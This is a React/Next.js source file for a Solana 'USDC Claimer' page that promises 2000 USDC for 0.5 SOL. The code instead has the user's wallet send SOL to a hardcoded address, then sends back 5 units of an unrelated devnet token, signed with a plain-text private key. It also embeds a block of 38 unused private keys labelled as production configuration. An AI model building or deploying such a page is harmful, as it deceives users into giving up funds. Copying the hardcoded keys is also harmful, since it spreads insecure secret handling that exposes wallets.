/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5uxYixuEQo3rjGS8csrnXvW76pwD96A1e5oW2kaqLsuPUYGahM4iKGt1fg6B3wmGiRRLUS8FtwojwJnYr9zhz1ok"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4g6q7ZxiS6uLnjwEFcwYc8YER7g9fcdrFkXLnCWazsY1BN8BsEUoFLZjGrLFKtmohNTFUEt1UJwXAAQzxDFuHUU9",
  "key1": "4NBzEagLCSsAZCTz4g1oQQytB63qXb4PSDNW9tkWZtVvRCcKLDffD8rLc3DLjS9uHSCdqW2kRKUS5ETKrAUoxFVw",
  "key2": "5ocaP1ZhY4knjH7YPYhPTnN3Q923RjtvptuJgi2mHxsvCNKbQ6NbeQDBGjSxka6YsEiGzY7HJQCZAmvzFBVSY3ca",
  "key3": "2AsCvj76KFdWkzcrZ6yYhGicJV4nS4qHvLBh1C3iSHyoESBJr7WGJwFyq2HdDJ9ePcrVHGnAVc48rm2tnexMqcQB",
  "key4": "7ghzZTSGCJnD5WtTBKkAT4PCvZyAdU8ekjbTfqvmCjDcjthzmpmAVmckDgVMP3nGZ1j42EjjJYyE4WGJwV8s6gV",
  "key5": "y95b1EWxi2ydxmm2XUh95G6QgsJbnMSrp39DxG9cgtF3sVpbPfbTzbMaoT5RnqxmapMQ8PjtgsnqZNDvtfU6BV9",
  "key6": "57nvFwsUhRXFYVoyqVHhh39tuwFW83EmxVyd4GbphxKFwwY57A97amozbjPbiwQheuXzb51jsmFRsxrhyHP8aQ2P",
  "key7": "kpYtLZb1qKi4jmS7Pv8LkRh2x1GAQe1MVQJzA3xqeJs8odpLM3ypHN8cSbniGWeeHEEzmhbt7oECJTU21Eq4QW4",
  "key8": "2CfMr6jb38EsLjmpoPb7EYKE2vBqWosNQehFtC344P4smazrqDqWuAgLwngxybYbuSTvE8tWQoxrFk15nLvKaM5z",
  "key9": "66T1w7KDrJCs3uuXfWQHLdNXUZTYk2wR3D79HNFu7Fm651hpiXNfq3KshoUDhfcQ2YQC1tpQvoyUJbn8CkSjGm6h",
  "key10": "ZdjkUYXhdsdwGK196xBsbYmtSkL4gep4mjDzEAio4o8z3qNaNu5fP5VjdJ39j3kxTQstE6MEvfdyywifjoBpYJN",
  "key11": "3ovZx9GS3W378ojgcPGLJ1j7fkzZTPcKrHjM6owrhKC3kYcrkYRZnAQLR9kcmyRjsGbskzcPjSFqnCYA1paygp7h",
  "key12": "28TaiVw7D4wi6eeqMFfZFi64J6iYvNAZfYC8vUt1rMXZMqofJUa6Vz8YdXaxK9GveDbWpVr9iyA53iLqg5Efbr7Z",
  "key13": "3y42ty1qtqXYiYU76YxPouzFiq1PPZMXrnPtikKMzvod7gRgk5msZrwxX4dvzfxPJzisme2kUCNZ8iuLcGHekWmJ",
  "key14": "3qDrsHv4DaiSuFxZyzUtuuhgYvSLRkUtrkoj1wqWpVn2QSL9HSFXJSN2b6VSsydPFhXTUBZUZR2bwRjN3GB6GnfZ",
  "key15": "3e8mgXT3529ByobHGtFjb3vhkyfsVQ6oHj1DUSrz2U5VMLbhWSRdeneWWNZ9zxMAphHqw1jmvA5cBLbC7BJ1F3EN",
  "key16": "2X7DnN2udkUUMU1co9XNfVNLuEfn1uWVSx7vhhceTsoChAmzBHMK4NDPwDSPmYzCchGAhnUre9b9CuNFPYYcLmTY",
  "key17": "5T59EziFBkJMo4A5kHSZvUrphP2TRAZ9kUTYAT3cyUknH8RLrGV5qo2P5T7XL5BL2vZ1VxG5Us73Cgpp6kWygYNo",
  "key18": "3sYgqpAaCAiUpqGs1WtN8jSRuU2YJjTWy5UVSBY3TnZH2QKXpmk5eyXv8dCe3rEAYEn28YnwAg88AHr1c6SqH9UT",
  "key19": "2dsGrZWRPLU2anS3pgh4mEJsh7sUrfGsAzRsu72gzWsYt4uoAz1sphUZo2tNBku6nkM9uHY97igYSs46oYK4v1PM",
  "key20": "281XUdAjj2uyiY3MAdE6uZ2N3TBSZbgs28F2cY8YvyaC2PM2VA94GWCB86wxGMPHbq78TV3jTpZRf6znap9dMsec",
  "key21": "4XBVpNYeVstjMz1QJz3xubHAnpDz81x5ZVtXpw7jqw5nsmya2gK4NUeek4Ujh4HTNiyJt2SkQskHLeDZmowsSUqq",
  "key22": "28YuY5s3yfsY5JddoxFucHt6H5TVzJr51fmfzK6eoQeeUqfWGMPKwnSb2ZwotLcc1Y65UofMFr8SuyFHEhLz8ksr",
  "key23": "27RzN1dMqFQNkTTVyS3W3Tp8VnHJmGycZzM9BrF7i9hva11KsW37YPS3SXhq1r23B3Xer5G9tW1wo49UQf3eqsnh",
  "key24": "rcVcuoxRNPZJKDp4YNwLXkXviwWxSuKHsoF5JX29BJmERQj9mBfb11eiPbQ7hdwp2A3pvCWrAfWHo3AyihLRZoK",
  "key25": "5dYQ8YfsoDppwhQc5e5sR2PJFy8BuFu4PBLKXJGZLEjrtLvEvrZMWqGMXLE2Rk9yB4DjFs977WPUf1Z6kwehoQq7",
  "key26": "5BdhqeUojYMDttbdSeNVrYRkRC99WLUBMvZDRRMY4ciYzavzCch3XBudLzxFckxQs15ehAeFeL3ohWKCDJv6tLjU",
  "key27": "5N6Q1837NUySBqoBgXtfRtihDUeMyYHtstbgnFaYCprpgzxzrEXXCf5qThThVF8krJiEiPodt2Fg41uUWvYuCR3b",
  "key28": "5HiSNPiCMuM9Yvs3b95rzn48c9RuYg6o4WswQdfRixj1BF7TpctQbzp5Djyt9XuHgSRU6gAxKmc8Az4disHR1s3v",
  "key29": "4LsruxWhYwx5PVziES7wSWEUU9soGroiPEkjnkSrrwkwYtbUGXe7gkepdDybgm2jZRvdo5iwkfCyKH48nuRoQXZ7",
  "key30": "5TxSzBsRfhJkQApW3Ve7bdkQ3npSBj9HqkgSJB26TtVJ2WfQFY4qceJ7BHq1RXQcrTpahdpjtF3tRFJfbegvC9Kk",
  "key31": "4f9Xej8ouAcszw3gWtx5asAGLn1sjdPatUimePoDHjePTceuxDUBqmd7L1qy2CD3suvkonSctJLagAp5a9qGJFmu",
  "key32": "ZXrjVVYoxrwU6XpwJoCUDwdMJTDmHJWJVPtdh79UBBWnsQFoMPkyTvyAebB9AM7T2DfoGeL9ikfc1TVDCAmVdVz",
  "key33": "3kqjVrWaQepqxf7sH6mzhr1b5UiKMbWX3UKjsQvGbDk6dKbbcjJnnxcJy4LY3Jks1ycmYMVwPkUXdzhccbyH9uou",
  "key34": "4RUZVQB3qtws4mbTbtRh9hXMV8tQWhvtKPXiTkXdWCPec5RQs8bMUgNM5SHcG2UrfLj5fLLnQ15bspZ76oZVXoZi",
  "key35": "4Y5vC1ttK64RNLLL9a2VW3JNhTqsKVANGGHC9gxsvz5oEJZqS2JS1yE9H22qRoXwUQUPStZoiLaEHaGoA3BR1Jxx",
  "key36": "487GqE7EBWmpiLDYPPH1H2Un68CzL3Jdx4Emq2NSvBuD8UuAbtXPWyb8KASmi6PMz4Rdtq1WaEvhvm99ka1hxPeP",
  "key37": "zbRpZv3rbnE5dDUGXnzVVcyFyuxhsuPSrBEcqJUbBD6sHqCVizTwsjhq17xje3549DBCkwQqZntcbEXMmAFSfok"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
